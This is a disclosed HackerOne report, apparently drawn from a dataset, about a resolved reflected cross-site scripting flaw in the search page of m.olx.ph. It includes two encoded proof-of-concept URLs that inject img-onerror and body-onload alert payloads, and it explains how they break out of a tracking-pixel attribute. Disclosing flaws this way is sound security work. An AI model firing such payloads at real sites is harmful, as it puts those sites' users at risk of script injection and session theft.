---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '175410'
original_report_id: '175410'
title: Reflected XSS at m.olx.ph
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-10-12T16:04:55.665Z'
disclosed_at: '2016-10-20T15:35:11.063Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS at m.olx.ph

## Metadata

- HackerOne Report ID: 175410
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-10-20T15:35:11.063Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## INTRO

The m.olx.ph domain is vulnerable to reflected XSS through the search function.

### EXPLOITABILITY & PoC

The following URL contains an XSS vector, which causes an alert box to appear


https://m.olx.ph/all-results?q=:%27%3E%3Cimg%20src=/%20onerror=alert%28document.domain%29%3E

or

https://m.olx.ph/all-results?q=:%27%3E%3CBODY%20ONLOAD=javascript:alert%281%29%3E


### Fix & Mitigation:

The escaping sequence is force with q=__:'>__  rendering this html code:

<img style="display:none;" alt="" src="https://LOGw305.ati-host.net/hit.xiti?s=524255&amp;stc={&quot;member_id&quot;:&quot;&quot;,&quot;member_category&quot;:&quot;free_user&quot;,&quot;page_name&quot;:&quot;ads_list&quot;,&quot;page_nb&quot;:1,&quot;keyword&quot;:&quot;:" height="1" width="1"> <- escape here closing <img> tag

","user_status":"unlogged_user"}' >   <- this is rendered as html, before this we can inject the payloads

-

*Tested on  Mozilla Firefox 45.0.2. 

(Screenshots attached)

Please let me know if more info needed,

Best Regards,

@ak1t4

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
